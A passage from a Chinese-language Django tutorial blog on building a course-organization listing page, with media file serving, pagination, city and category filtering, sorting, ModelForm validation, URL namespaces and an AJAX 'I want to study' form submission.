src="https://upload-images.jianshu.io/upload_images/1779926-83dfdbfbaa20542d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/656" alt="img"></p><p>这时就是我们在后台添加的数据了</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-2eb22db915719213.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/323" alt="img"></p><p>可以看到每个课程机构都是一个dl</p><p>同理使用for循环。</p><h3 id="如何将imageField转换为图片地址"><a href="#如何将imageField转换为图片地址" class="headerlink" title="如何将imageField转换为图片地址"></a>如何将imageField转换为图片地址</h3><p>数据库中img存放的是字符串：相对路径</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-53103bff844f22bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/158" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-4e076b8495da8019.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/256" alt="img"></p><p>上图这种取法会取出一个相对地址。</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-7c3f56ea58b34976.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/344" alt="img"></p><p>将setting中配置的mediaurl放在前面可以补全地址。</p><h3 id="设置media处理器"><a href="#设置media处理器" class="headerlink" title="设置media处理器"></a>设置media处理器</h3><p><img src="https://upload-images.jianshu.io/upload_images/1779926-8d0f3064ef7c0046.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/503" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-7b269fdf75aadd09.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/421" alt="img"></p><blockquote><p>注册之后，mediaurl将可以在html中使用</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/1779926-bb9af0c094309efc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/219" alt="img"></p><p>图片还是没有显示。因为url中没有处理图片相应路径的url</p><p>Django1.9.8 urls.py:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from django.views.static import serve</span><br><span class="line">    # 处理图片显示的url,使用Django自带serve,传入参数告诉它去哪个路径找，我们有配置好的路径MEDIAROOT</span><br><span class="line">    url(r&#39;^media&#x2F;(?P&lt;path&gt;.*)$&#39;, serve, &#123;&quot;document_root&quot;: MEDIA_ROOT &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/1779926-9d831518aec0223a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/541" alt="img"></p><p>Django2.0.1 urls.py:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from django.views.static import serve</span><br><span class="line"># 处理图片显示的url,使用Django自带serve,传入参数告诉它去哪个路径找，我们有配置好的路径MEDIAROOT</span><br><span class="line">    re_path(r&#39;^media&#x2F;(?P&lt;path&gt;.*)&#39;, serve, &#123;&quot;document_root&quot;: MEDIA_ROOT &#125;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="完善xadmin的adminx为机构添加分类索引字段"><a href="#完善xadmin的adminx为机构添加分类索引字段" class="headerlink" title="完善xadmin的adminx为机构添加分类索引字段"></a>完善xadmin的adminx为机构添加分类索引字段</h3><p>organization/adminx.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 机构课程信息管理器</span><br><span class="line">class CourseOrgAdmin(object):</span><br><span class="line">    list_display &#x3D; [&#39;name&#39;, &#39;desc&#39;,&#39;category&#39;, &#39;click_nums&#39;, &#39;fav_nums&#39;,&#39;add_time&#39; ]</span><br><span class="line">    search_fields &#x3D; [&#39;name&#39;, &#39;desc&#39;, &#39;category&#39;,&#39;click_nums&#39;, &#39;fav_nums&#39;]</span><br><span class="line">    list_filter &#x3D; [&#39;name&#39;, &#39;desc&#39;,&#39;category&#39; ,&#39;click_nums&#39;, &#39;fav_nums&#39;,&#39;city__name&#39;,&#39;address&#39;,&#39;add_time&#39;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="去除加载小圈圈"><a href="#去除加载小圈圈" class="headerlink" title="去除加载小圈圈"></a>去除加载小圈圈</h3><p>static/css/style.css中scrollLoading置为空:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.scrollLoading &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="列表分页功能"><a href="#列表分页功能" class="headerlink" title="列表分页功能"></a>列表分页功能</h2><p>github搜索django-pure-pagination</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install django-pure-pagination</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/1779926-275219a33e37848b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/441" alt="img"></p><p>install app中添加:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;pure_pagination&#39;,</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可设置参数；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PAGINATION_SETTINGS &#x3D; &#123;</span><br><span class="line">    &#39;PAGE_RANGE_DISPLAYED&#39;: 10,</span><br><span class="line">    &#39;MARGIN_PAGES_DISPLAYED&#39;: 2,</span><br><span class="line">    &#39;SHOW_FIRST_PAGE_WHEN_INVALID&#39;: True,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/1779926-58d6c360e4ae963f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="img"></p><p><code>PAGE_RANGE_DISPLAYED</code>是总共会显示多少个page。(包括省略号，包括两边和中间)<br><code>MARGIN_PAGES_DISPLAYED</code>是旁边会显示多少个。<br><code>SHOW_FIRST_PAGE_WHEN_INVALID</code>:当输入页数不合法是否要跳到第一页</p><p>官方实例；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from django.shortcuts import render_to_response</span><br><span class="line"></span><br><span class="line">from pure_pagination import Paginator, EmptyPage, PageNotAnInteger</span><br><span class="line"></span><br><span class="line">    # 尝试获取页数参数</span><br><span class="line">    try:</span><br><span class="line">        page &#x3D; request.GET.get(&#39;page&#39;, 1)</span><br><span class="line">    except PageNotAnInteger:</span><br><span class="line">        page &#x3D; 1</span><br><span class="line">    # objects是取到的数据</span><br><span class="line">    objects &#x3D; [&#39;john&#39;, &#39;edward&#39;, &#39;josh&#39;, &#39;frank&#39;]</span><br><span class="line"></span><br><span class="line">    # Provide Paginator with the request object for complete querystring generation</span><br><span class="line">    # 对于取到的数据进行分页处理。</span><br><span class="line">    p &#x3D; Paginator(objects, request&#x3D;request)</span><br><span class="line">    # 此时前台显示的就应该是我们此时获取的第几页的数据</span><br><span class="line">    people &#x3D; p.page(page)</span><br><span class="line"></span><br><span class="line">    return render_to_response(&#39;index.html&#39;, &#123;</span><br><span class="line">        &#39;people&#39;: people,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们对照着的实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from pure_pagination import Paginator, EmptyPage, PageNotAnInteger</span><br><span class="line">class OrgView(View):</span><br><span class="line">    def get(self,request):</span><br><span class="line">        # 查找到所有的课程机构</span><br><span class="line">        all_orgs &#x3D; CourseOrg.objects.all()</span><br><span class="line">        # 总共有多少家机构使用count进行统计</span><br><span class="line">        org_nums &#x3D; all_orgs.count()</span><br><span class="line">        # 取出所有的城市</span><br><span class="line">        all_city &#x3D; CityDict.objects.all()</span><br><span class="line">        # 对课程机构进行分页</span><br><span class="line">        # 尝试获取前台get请求传递过来的page参数</span><br><span class="line">        # 如果是不合法的配置参数默认返回第一页</span><br><span class="line">        try:</span><br><span class="line">            page &#x3D; request.GET.get(&#39;page&#39;, 1)</span><br><span class="line">        except PageNotAnInteger:</span><br><span class="line">            page &#x3D; 1</span><br><span class="line">        # 这里指从allorg中取五个出来，每页显示5个</span><br><span class="line">        p &#x3D; Paginator(all_orgs, 5, request&#x3D;request)</span><br><span class="line">        orgs &#x3D; p.page(page)</span><br><span class="line"></span><br><span class="line">        return render(request, &quot;org-list.html&quot;, &#123;</span><br><span class="line">            &quot;all_orgs&quot;:orgs,</span><br><span class="line">            &quot;all_city&quot;: all_city,</span><br><span class="line">            &quot;org_nums&quot;: org_nums,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="对于html中分页进行配置"><a href="#对于html中分页进行配置" class="headerlink" title="对于html中分页进行配置"></a>对于html中分页进行配置</h3><blockquote><p>不再是objects，而是objectlist</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/1779926-1493d3cb2a0b5ad9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/405" alt="img"></p><blockquote><p>使用默认的render</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-1b62adaffd345c87.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/253" alt="img"></p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/1779926-de5a88f372285e72.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/152" alt="img"></p><h3 id="自定义html的样式"><a href="#自定义html的样式" class="headerlink" title="自定义html的样式"></a>自定义html的样式</h3><p><img src="https://upload-images.jianshu.io/upload_images/1779926-30dc35d6c19cf3fc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/658" alt="img"></p><h2 id="分类筛选功能"><a href="#分类筛选功能" class="headerlink" title="分类筛选功能"></a>分类筛选功能</h2><p><img src="https://upload-images.jianshu.io/upload_images/1779926-aa8b0670ecbf66e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/525" alt="img"></p><p>当用户点击某一个city时对应加上参数city的id</p><h3 id="在后台处理这个city"><a href="#在后台处理这个city" class="headerlink" title="在后台处理这个city"></a>在后台处理这个city</h3><p><img src="https://upload-images.jianshu.io/upload_images/1779926-39abc6680f10002d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/377" alt="img"></p><p>获取传入的参数进行进一步筛选。</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-1ec9f66912ea1bc6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/224" alt="img"></p><blockquote><p>将city_id传回html，使得可以知道哪个是选中的。</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/1779926-6a43ae8fba8f53ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="img"></p><p>因为city.id是后端传回来的值是一个int。所以我们要做类型转换。</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-1ae5d63ae1f5d7d7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/602" alt="img"></p><p>当city_id为空的时候，显示全部。</p><h3 id="后台处理类别"><a href="#后台处理类别" class="headerlink" title="后台处理类别"></a>后台处理类别</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 类别筛选</span><br><span class="line">      category &#x3D; request.GET.get(&#39;ct&#39;, &quot;&quot;)</span><br><span class="line">      if category:</span><br><span class="line">          # 我们就在机构中作进一步筛选类别</span><br><span class="line">          all_orgs &#x3D; all_orgs.filter(category&#x3D;category)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>返回前台类别值以active</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">return render(request, &quot;org-list.html&quot;, &#123;</span><br><span class="line">          &quot;all_orgs&quot;:orgs,</span><br><span class="line">          &quot;all_city&quot;: all_city,</span><br><span class="line">          &quot;org_nums&quot;: org_nums,</span><br><span class="line">          &quot;city_id&quot;:city_id,</span><br><span class="line">          &quot;category&quot;:category,</span><br><span class="line">      &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/1779926-72d903ef5200a1e7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="img"></p><p>对于类别做同样的ifequal判断</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-2305e782e28994d3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="img"></p><p>如上图所示进行城市与分类的联动:</p><p>当选择全部类别的时候，就只通过当前城市id。<br>当选择全部城市的时候，就只通过当前目录id。<br>当两者都选的时候使用&amp;连接。</p><p>刚才统计机构数目过早，应该移到后面后面已经筛选过后，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 总共有多少家机构使用count进行统计</span><br><span class="line">       org_nums &#x3D; all_orgs.count()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="课程机构排名"><a href="#课程机构排名" class="headerlink" title="课程机构排名"></a>课程机构排名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 热门机构,如果不加负号会是有小到大。</span><br><span class="line">     hot_orgs &#x3D; all_orgs.order_by(&quot;-click_nums&quot;)[:3]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/1779926-ddd1ad924aa2a513.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/486" alt="img"></p><p>循环时内置变量forloop.counter取当前循环到第几次</p><p>待完成:点击排名机构的连接</p><h3 id="课程机构排序。"><a href="#课程机构排序。" class="headerlink" title="课程机构排序。"></a>课程机构排序。</h3><p>学习人数，课程数</p><p>organization/models.py<br>CourseOrg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 当学生点击学习课程，找到所属机构，学习人数加1</span><br><span class="line">   students &#x3D; models.IntegerField(default&#x3D;0, verbose_name&#x3D;u&quot;学习人数&quot;)</span><br><span class="line">   # 当发布课程就加1</span><br><span class="line">   course_nums &#x3D;  models.IntegerField(default&#x3D;0, verbose_name&#x3D;u&quot;课程数&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">makemigrations organization</span><br><span class="line">migrate organization</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前端页面学习人数，添加参数sort</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-b05db6ec30dc16e4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/647" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 进行排序</span><br><span class="line">       sort &#x3D; request.GET.get(&#39;sort&#39;, &quot;&quot;)</span><br><span class="line">       if sort:</span><br><span class="line">           if sort &#x3D;&#x3D; &quot;students&quot;:</span><br><span class="line">               all_orgs &#x3D; all_orgs.order_by(&quot;-students&quot;)</span><br><span class="line">           elif sort &#x3D;&#x3D; &quot;courses&quot;:</span><br><span class="line">               all_orgs &#x3D; all_orgs.order_by(&quot;-course_nums&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>添加选择效果</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-504eec2c00e2a6c2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/649" alt="img"></p><h2 id="modelform-提交我要学习咨询1"><a href="#modelform-提交我要学习咨询1" class="headerlink" title="modelform 提交我要学习咨询1"></a>modelform 提交我要学习咨询1</h2><p>对应表<code>userask</code></p><p><code>form</code>会对字段先做验证，然后保存到数据库中。</p><p>可以看到我们的forms和我们的model中有很多内容是一样的。我们如何让代码重复利用呢？</p><p>使用modelform解决这个问题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># encoding: utf-8</span><br><span class="line">from django import forms</span><br><span class="line"></span><br><span class="line">from operation.models import UserAsk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 普通版本的form</span><br><span class="line"># class UserAskForm(forms.Form):</span><br><span class="line">#     name &#x3D; forms.CharField(required&#x3D;True, min_length&#x3D;2, max_length&#x3D;20)</span><br><span class="line">#     phone &#x3D; forms.CharField(required&#x3D;True, max_length&#x3D;11, min_length&#x3D;11)</span><br><span class="line">#     course_name &#x3D; forms.CharField(required&#x3D;True, min_length&#x3D;5, max_length&#x3D;50)</span><br><span class="line"></span><br><span class="line"># 进阶版本的modelform：它可以向model一样save</span><br><span class="line">class AnotherUserForm(forms.ModelForm):</span><br><span class="line">    # 继承之余还可以新增字段</span><br><span class="line"></span><br><span class="line">    # 是由哪个model转换的</span><br><span class="line">    class Meta:</span><br><span class="line">        model &#x3D; UserAsk</span><br><span class="line">        # 我需要验证的字段</span><br><span class="line">        fields &#x3D; [&#39;name&#39;,&#39;mobile&#39;,&#39;course_name&#39;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="include的机制配置应用自己的url"><a href="#include的机制配置应用自己的url" class="headerlink" title="include的机制配置应用自己的url"></a>include的机制配置应用自己的url</h3><p>django1.9.8 创建organization/urls.py:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># encoding: utf-8</span><br><span class="line"></span><br><span class="line"># encoding: utf-8</span><br><span class="line">from organization.views import OrgView</span><br><span class="line">from django.conf.urls import url</span><br><span class="line"></span><br><span class="line">urlpatterns &#x3D; [</span><br><span class="line">    # 课程机构列表url</span><br><span class="line">    url(&#39;list&#x2F;&amp;&#39;, OrgView.as_view(), name&#x3D;&quot;org_list&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>django1.9.8 Mxonline2/urls.py:<br>删掉orglist,新增如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 课程机构app的url配置</span><br><span class="line">  url(r&quot;^org&#x2F;&quot;, include(&#39;organization.urls&#39;,namespace&#x3D;&quot;org&quot;)),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>django2.0.1: 新建organization/urls.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># encoding: utf-8</span><br><span class="line">from organization.views import OrgView</span><br><span class="line"></span><br><span class="line">from django.urls import path, re_path</span><br><span class="line"></span><br><span class="line">urlpatterns &#x3D; [</span><br><span class="line">    # 课程机构列表url</span><br><span class="line">    path(&#39;list&#x2F;&#39;, OrgView.as_view(), name&#x3D;&quot;org_list&quot;),</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>django2.0.1: urls.py中:</p><p>删掉org_list，新增include</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 课程机构app的url配置</span><br><span class="line">path(&quot;org&#x2F;&quot;, include(&#39;organization.urls&#39;,namespace&#x3D;&quot;org&quot;)),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用命名空间防止重复</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-f1e131c3c0a0abe9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/439" alt="img"></p><p>解决Django2.0.1报错:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   &#39;Specifying a namespace in include() without providing an app_name &#39; </span><br><span class="line">django.core.exceptions.ImproperlyConfigured: Specifying a namespace in </span><br><span class="line">include() without providing an app_name is not supported. Set the app_name </span><br><span class="line">attribute in the included module, or pass a 2-tuple containing the list of </span><br><span class="line">patterns and app_name instead. </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在自己的app下的urls中写上appname</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># encoding: utf-8</span><br><span class="line">from organization.views import OrgView</span><br><span class="line"></span><br><span class="line">from django.urls import path, re_path</span><br><span class="line"></span><br><span class="line">app_name &#x3D; &quot;organization&quot;</span><br><span class="line"></span><br><span class="line">urlpatterns &#x3D; [</span><br><span class="line"></span><br><span class="line">    # 课程机构列表url</span><br><span class="line">    path(&#39;list&#x2F;&#39;, OrgView.as_view(), name&#x3D;&quot;org_list&quot;),</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>html中使用命名空间方式:</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-ed075c1077b21a8a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/511" alt="img"></p><h3 id="使用modelform做提交"><a href="#使用modelform做提交" class="headerlink" title="使用modelform做提交"></a>使用modelform做提交</h3><p>比较合理的操作是异步的，不会对整个页面进行刷新。<br>如果有错误，显示错误。一种ajax的异步操作。</p><p>因此我们此时不能直接render一个页面回来。<br>应该是给前端返回json数据，而不是页面</p><p><code>HttpResponse</code>类指明给用户返回哪种类型数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from django.http import HttpResponse</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>配置一个modelform的view</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 用户添加我要学习</span><br><span class="line">class AddUserAskView(View):</span><br><span class="line">    # 处理表单提交当然post</span><br><span class="line">    def post(self,request):</span><br><span class="line">        userask_form &#x3D; UserAskForm(request.POST)</span><br><span class="line">        # 判断该form是否有效</span><br><span class="line">        if userask_form.is_valid():</span><br><span class="line">            # 这里是modelform和form的区别</span><br><span class="line">            # 它有model的属性</span><br><span class="line">            # 当commit为true进行真正保存</span><br><span class="line">            user_ask &#x3D; userask_form.save(commit&#x3D;True)</span><br><span class="line">            # 这样就不需要把一个一个字段取出来然后存到model的对象中之后save</span><br><span class="line"></span><br><span class="line">            # 如果保存成功,返回json字符串,后面content type是告诉浏览器的,</span><br><span class="line">            return HttpResponse(&quot;&#123;&#39;status&#39;: &#39;success&#39;&#125;&quot;, content_type&#x3D;&#39;application&#x2F;json&#39;)</span><br><span class="line">        else:</span><br><span class="line">            # 如果保存失败，返回json字符串,并将form的报错信息通过msg传递到前端</span><br><span class="line">            return HttpResponse(&quot;&#123;&#39;status&#39;: &#39;fail&#39;, &#39;msg&#39;:&#123;0&#125;&#125;&quot;.format(userask_form.errors),  content_type&#x3D;&#39;application&#x2F;json&#39;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="配置相应的url"><a href="#配置相应的url" class="headerlink" title="配置相应的url"></a>配置相应的url</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 添加我要学习</span><br><span class="line">path(&#39;add_ask&#x2F;&#39;, AddUserAskView.as_view(), name&#x3D;&quot;add_ask&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="modelform-提交我要学习"><a href="#modelform-提交我要学习" class="headerlink" title="modelform 提交我要学习"></a>modelform 提交我要学习</h2><h3 id="分析ajax请求"><a href="#分析ajax请求" class="headerlink" title="分析ajax请求"></a>分析ajax请求</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $(function()&#123;</span><br><span class="line">        $(&#39;#jsStayBtn&#39;).on(&#39;click&#39;, function()&#123;</span><br><span class="line">            $.ajax(&#123;</span><br><span class="line">                cache: false,</span><br><span class="line">                type: &quot;POST&quot;,</span><br><span class="line">                url:&quot;&#123;% url &quot;org:add_ask&quot; %&#125;&quot;,</span><br><span class="line">                data:$(&#39;#jsStayForm&#39;).serialize(),</span><br><span class="line">                async: true,</span><br><span class="line">                success: function(data) &#123;</span><br><span class="line">                    if(data.status &#x3D;&#x3D; &#39;success&#39;)&#123;</span><br><span class="line">                        $(&#39;#jsStayForm&#39;)[0].reset();</span><br><span class="line">                        alert(&quot;提交成功&quot;)</span><br><span class="line">                    &#125;else if(data.status &#x3D;&#x3D; &#39;fail&#39;)&#123;</span><br><span class="line">                        $(&#39;#jsCompanyTips&#39;).html(data.msg)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>监听这个button，用户如果点击了button。我们来向这个url进行post请求。<br>将我们的表单进行序列化。</p></blockquote><p>form表单添加crsf_token</p><p>如果后台返回的状态值为success，那么我们将弹出提交成功。<br>失败，就会在错误提示框中写入。</p><h3 id="手机号码正则表达式验证"><a href="#手机号码正则表达式验证" class="headerlink" title="手机号码正则表达式验证:"></a>手机号码正则表达式验证:</h3><p>organization/forms.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 